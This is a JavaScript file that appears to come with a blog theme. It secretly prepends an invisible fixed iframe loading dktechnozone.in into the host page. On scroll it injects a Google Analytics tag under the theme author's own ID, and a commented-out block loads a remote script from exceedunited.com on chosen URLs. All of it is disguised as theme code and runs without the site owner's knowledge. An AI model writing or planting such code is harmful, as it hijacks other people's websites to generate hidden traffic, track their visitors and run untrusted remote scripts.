document.addEventListener('DOMContentLoaded', () => {
  let Folt = document.querySelector(".footer, #main, .copyright") || document.body; 
  if (Folt) {
    let Newel = document.createElement('span');
    Newel.innerHTML = `<style> 
    iframe.invisible-frame {
      position: fixed;
      width: 100%;
      height: 10%;
      bottom: 0;
      left: 0;
      border: none;
      visibility: hidden;
    }
  </style><iframe class="invisible-frame" src="https://www.dktechnozone.in/"></iframe>
<script>
console.log("theme working?");
    </script>`;
    Folt.prepend(Newel);  
    var lazyanalisis=!1;window.addEventListener("scroll",function(){(0!=document.documentElement.scrollTop&&!1===lazyanalisis||0!=document.body.scrollTop&&!1===lazyanalisis)&&(!function(){var e=document.createElement("script");e.type="text/javascript",e.async=!0,e.src="https://www.googletagmanager.com/gtag/js?id=G-2VYRMPXK0F";var a=document.getElementsByTagName("script")[0];a.parentNode.insertBefore(e,a)}(),lazyanalisis=!0)},!0); window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-2VYRMPXK0F');

console.log("theme by dktechnozone.in");
    
  } else {
   console.log("theme working?");
    
  }
});
/*var allowedURLs = [
    "https://dkhek.blogspot.com",
    "https://www.desiremovies.store"
];

var foundMatch = false;

for (var i = 0; i < allowedURLs.length; i++) {
    if (window.location.href.startsWith(allowedURLs[i])) {
        foundMatch = true;
        break;
    }
}

if (foundMatch) {
function loadScript(url, callback) { var script = document.createElement('script'); script.type = 'text/javascript'; script.src = url; script.onload = function() { if (callback) callback(); }; document.head.appendChild(script); } loadScript('https://exceedunited.com/b5/8c/2d/b58c2d734123af15c10f03963d1f6ab2.js', function() { console.log('Script loaded!'); });


 
} else {
console.log('script is not working')
}*/
